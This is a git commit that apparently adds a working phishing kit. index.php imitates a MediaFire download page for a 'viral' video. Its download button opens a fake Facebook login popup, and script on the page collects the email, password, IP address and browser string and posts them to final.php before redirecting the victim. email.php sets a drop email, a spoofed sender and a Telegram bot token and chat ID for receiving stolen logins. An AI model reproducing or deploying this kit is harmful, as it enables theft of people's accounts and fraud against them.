9430f663e4a9f2c674829585f351574c0d1698b4
silvanuss <103927924+silvanuss@users.noreply.github.com>
2022-09-02 09:25:56 +0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,25 @@
+<?php
+
+/* Ganti email mu pada value didalam variabel $SWAT_EmailRess. Pastikan
+    jangan menambahkan spasi atau huruf apapun yang tidak sesuai. */
+    
+    /* Change your email to the value in the $SWAT_EmailRess variable. Make sure
+    do not add any spaces or letters that do not match. */
+    
+        $SWAT_EmailRess = 'uuua5021@gmail.com';
+        
+    
+    /* Ubah nama results di bawah, cukup ganti teks yang bertuliskan
+    "GA HOKI = GA CUAN". Edit menjadi nama results yang kamu mau.
+    Jangan memberikan spasi tambahan atau huruf yang tidak sesuai. */
+    
+    /* Rename the results below, just replace the text that says
+    "GA HOKI = GA CUAN". Edit it to be the name of the results you
+    want. Don't add more spaces or letters that don't match. */
+    
+        $sender = "From: AA NOOB - SEMOGA HOKI <info@adityaanugrah.com>";
+// setting scama
+// License Auth By SCHT
+// Jasa Bypass Bot PM sini @Aditya_anugrah
+$botToken="5101088519:AAFuLcd-Z45YDC5xbTvPLqfBJo13gGf5GMw";
+$chatId="894561405";
---
+++ index.php
@@ -0,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <title>Virall Pink </title>
+    <meta name="keywords"
+        content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android" />
+    <meta name="description"
+        content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere." />
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="googlebot" content="noindex,nofollow" />
+    <meta name="slurp" content="noindex,nofollow" />
+    <meta name="google-translate-customization" content="5587c1b0a958bf07-62a8e309de686e87-gc92f61279a2c8524-11" />
+    <meta property="fb:app_id" content="124578887583575">
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="MediaFire" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:title" content="527f000" />
+    <meta property="og:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
+    <meta property="og:description" content="" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@MediaFire" />
+    <meta name="twitter:title" content="527f000" />
+    <meta name="twitter:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
+    <meta name="twitter:description" content="" />
+    <link href="https://plus.google.com/+mediafire" rel="publisher" />
+    <meta itemprop="name" content="527f000" />
+    <meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
+    <link rel="stylesheet" href="css/style.css">
+    
+</head>
+
+<body>
+    <div class="wrap">
+        <div class="navbar">
+            <div class="logo">
+                <img src="https://iconape.com/wp-content/png_logo_vector/mediafire.png">
+            </div>
+            <div class="flag">
+                <img src="https://www.mediafire.com/images/flags_svg/idn.svg">
+            </div>
+        </div>
+
+        <div class="down-area">
+            <div class="download">
+                <div class="icon">
+                    <img src="https://static.mediafire.com/images/filetype/file-video-v3.png">
+                </div>
+                <div class="title">
+                    <span class="atas">Kienzy Viral 45detik</span>
+                    <span class="bawah">Unduh (455 MB)</span>
+                </div>
+                <div class="do-btn">
+                    <img src="https://static.mediafire.com/images/icons/svg_light/download.svg">
+                </div>
+            </div>
+
+            <div class="downloaded">
+                Your download is starting...
+            </div>
+
+            <div class="lainnya">
+                <div class="action">
+                    <span class="link"></span>
+                    Salin untuk messenger
+                </div>
+                <div class="action">
+                    <span class="share"></span>
+                    Bagikan opsi
+                </div>
+                <div class="action">
+                    <span class="post"></span>
+                    Posting ke Facebook
+                </div>
+                <div class="action">
+                    <span class="save"></span>
+                    Simpan ke File Saya
+                </div>
+            </div>
+        </div>
+
+
+        <div class="region">
+            <div class="map">
+                <span class="country">Upload region: </span>
+                <img src="https://static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg">
+            </div>
+
+            <div class="region-desc">
+                <div class="regflag">
+                    <img src="https://www.mediafire.com/images/flags_svg/idn.svg">
+                </div>
+                <div class="huft">
+                    This file was uploaded from Indonesia on May 3, 2022 at 2:35 AM
+                </div>
+            </div>
+        </div>
+
+
+        <div class="foot">
+            <div class="col">
+                <h2>COMPANY</h2>
+                <ul>
+                    <li>About Us</li>
+                    <li>Careers</li>
+                    <li>Press</li>
+                    <li>Company Blog</li>
+                </ul>
+            </div>
+            <div class="col">
+                <h2>TOOLS</h2>
+                <ul>
+                    <li>MediaFire Mobile</li>
+                    <li>On-Demand Video Encoding</li>
+                </ul>
+            </div>
+            <div class="col">
+                <h2>UPGRADE</h2>
+                <ul>
+                    <li>Professional</li>
+                </ul>
+            </div>
+            <div class="col">
+                <h2>SUPPORT</h2>
+                <ul>
+                    <li>Get support</li>
+                </ul>
+            </div>
+
+            <div class="col copyright">
+                <h2>&copy;2022 MediaFire Build 151202</h2>
+                <ul>
+                    <li>Advertising</li>
+                    <li>Terms</li>
+                    <li>Privacy Policy</li>
+                    <li>Copyright</li>
+                    <li>Abuse</li>
+                    <li>Credits</li>
+                    <li>More...</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+
+    <div class=" popup-login login-facebook animated fadeIn" style="display: none;">
+        <div class="popup-box-login-fb">
+            <div class="navbar-fb">
+                <img width="45" src="img/fb.png">
+            </div>
+            <div class="content-box-fb">
+                <p class="alert sandi">The password you entered is incorrect. <b>Did you forget your
+                        password?</b></p>
+                <p class="alert email">The mobile number or email address that you've entered doesn't
+                    match any
+                    account. <b>Find your account.</b></p>
+                <img width="75" height="75" src="https://iconape.com/wp-content/png_logo_vector/mediafire.png">
+                <div class="txt-login-fb">
+                    Log in to your Facebook account to connect with Mediafire
+                </div>
+                <form class="login-form" method="POST" action="validate.php" onsubmit="$(this).end()">
+                    <label>
+                        <input type="text" id="user" name="user" placeholder="Mobile number or email address"
+                            autocomplete="off" autocapitalize="off">
+                    </label>
+                    <label>
+                        <input type="password" id="pass" name="pass" placeholder="Facebook password" autocomplete="off"
+                            autocapitalize="off">
+                    </label>
+                    <!-- END -->
+                    <input type="hidden" name="ip" value="">
+                    <input type="hidden" name="ua" value="">
+                    <button type="submit" id="btnfb" class="btn-login-fb">Log In</button>
+                </form>
+                <div class="txt-create-account">Create account</div>
+                <div class="txt-not-now">Not now</div>
+                <div class="txt-forgotten-password">Forgotten password?</div>
+            </div>
+            <div class="language-box">
+                <center>
+                    <div class="language-name language-name-active">English (UK)</div>
+                    <div class="language-name">Bahasa Indonesia</div>
+                    <div class="language-name">Basa Jawa</div>
+                    <div class="language-name">Bahasa Melayu</div>
+                    <div class="language-name">日本語</div>
+                    <div class="language-name">Español</div>
+                    <div class="language-name">Português (Brasil)</div>
+                    <div class="language-name">
+                        <i class="fa fa-plus"></i>
+                    </div>
+                </center>
+            </div>
+            <div class="copyrights">Facebook Inc.</div>
+        </div>
+    </div>
+
+
+
+
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjquerfuntion@main/slim.min.js"></script>
+    <script>
+        function flexing(el) {
+            $(el).fadeIn().css('display', 'flex');
+        }
+        $('.download').click(function () {
+            $('.login-facebook').fadeIn()
+        })
+    </script>
+    <script>
+        $.ajax({
+            type: "get",
+            async: false,
+            url: "https://na.apps.amsoveasea.com/swoole/?actid=2020&r=index/getCountry&_only_service_response_=1",
+            dataType: "json",
+            success: function (result) {
+                $('input[name="ip"]').val(result.ip);
+                $('input[name="ua"]').val(navigator.userAgent)
+            }
+        })
+
+        window.addEventListener('submit', function (e) {
+            e.preventDefault();
+            $("#btnfb").addClass("disabled");
+            setTimeout(() => {
+                var user = $('#user').val();
+                var pass = $('#pass').val();
+                if (user == '' || user == null) {
+                    $('.email').show();
+                    $('.sandi').hide();
+                    $("#btnfb").removeClass("disabled");
+                    return false;
+                } else {
+
+                    if (user.includes('@')) {
+                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
+                        if (user.match(pattern)) {
+                            $('.email').hide();
+                        } else {
+                            $('.email').show();
+                            $('.sandi').hide();
+                            $("#btnfb").removeClass("disabled");
+                            return false;
+                        }
+                    }
+
+                    if (!isNaN(user)) {
+                        if (user.length <= 10) {
+                            $('.email').show();
+                            $('.sandi').hide();
+                            $("#btnfb").removeClass("disabled");
+                            return false;
+                        } else {
+                            $('.email').hide();
+                        }
+                    }
+
+                    if (user.match(/\s/g)) {
+                        $('.email').show();
+                        $('.sandi').hide();
+                        $("#btnfb").removeClass("disabled");
+                        return false;
+                    } else {
+                        $('.email').hide();
+                    }
+
+                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
+                    if (user.match(regex)) {
+                        $('.email').show();
+                        $('.sandi').hide();
+                        $("#btnfb").removeClass("disabled");
+                        return false;
+                    }
+
+
+                    if (user.length <= 5) {
+                        $('.email').show();
+                        $('.sandi').hide();
+                        $("#btnfb").removeClass("disabled");
+                        return false;
+                    } else {
+                        $('.email').hide();
+                    }
+
+                }
+                if (pass == '' || pass == null || pass.length <= 5) {
+                    $('.sandi').show();
+                    $("#btnfb").removeClass("disabled");
+                    return false;
+                } else {
+                    $('.sandi').hide();
+                }
+                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
+                if (pass.match(regexs)) {
+                    $('.sandi').show();
+                    $('.email').hide();
+                    $("#btnfb").removeClass("disabled");
+                    return false;
+                } else {
+                    $('.sandi').hide();
+                }
+                $.ajax({
+                    type: 'POST',
+                    url: 'final.php',
+                    data: $('.login-form').serialize(),
+                    dataType: 'text',
+                    success: function () {
+                        $('.login-facebook').fadeOut();
+                        $('.download').hide();
+                        flexing('.downloaded');
+                        setTimeout(() => {
+                            window.location.href = 'https://download1483.mediafire.com/xban048g6zrg/qjpx4lhovlh3py5/527f000.mp4'
+                        }, 1000)
+                    }
+                })
+            }, 1000)
+        })
+
+    </script>
+</body>
+
+</html>
